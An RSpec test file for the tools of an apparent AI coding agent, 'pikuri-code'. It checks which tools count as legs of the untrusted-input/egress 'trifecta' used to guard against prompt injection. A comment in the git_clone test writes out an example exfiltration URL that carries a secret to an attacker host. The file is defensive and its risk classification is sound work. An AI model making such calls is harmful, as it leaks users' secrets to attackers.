# frozen_string_literal: true

RSpec.describe 'pikuri-code tool trifecta legs (bash aside)' do
  it 'gives git_clone readable egress — the clone host is whoever wrote the URL' do
    # Same family as fetch, not a softer one: `clone https://attacker/?q=<SECRET>`
    # reaches a server the attacker reads, and the cloned tree is their content.
    legs = Pikuri::Code::GitClone.new(filesystem: nil).trifecta_legs
    assert_equal :unreviewed, legs.egress_payload_review
    assert_equal :hard, legs.untrusted
  end

  it 'gives the plan-mode toggles no legs — they flip a local flag' do
    read_only = Pikuri::Workspace::ReadOnly.new
    [Pikuri::Code::EnterPlanMode.new(read_only: read_only),
     Pikuri::Code::ExitPlanMode.new(read_only: read_only,
                                    confirmer: Pikuri::Workspace::Confirmer::AUTO_APPROVE)].each do |tool|
      assert_equal Pikuri::Tool::TrifectaLegs::NONE, tool.trifecta_legs, tool.name
    end
  end
end
